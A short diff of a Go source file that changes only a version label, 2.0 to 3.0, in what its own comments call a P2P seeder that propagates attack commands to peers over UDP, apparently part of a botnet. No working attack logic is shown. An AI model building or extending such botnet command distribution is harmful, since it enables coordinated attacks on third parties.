@@ -11,7 +11,7 @@ import (
 )
 
 /*
- * AXIS 2.0 P2P Seeder
+ * AXIS 3.0 P2P Seeder
  * Seeds attack commands into the P2P network.
  * Works like a torrent seeder - continuously propagates attack commands
  * to all peers in the network via UDP.
@@ -29,7 +29,7 @@ var seedPeers = []string{
 }
 
 func main() {
-	fmt.Println("AXIS 2.0 P2P Seeder")
+	fmt.Println("AXIS 3.0 P2P Seeder")
 	fmt.Println("=====================")
 	fmt.Println("")
 	fmt.Printf("Seed peers: %v\n", seedPeers)
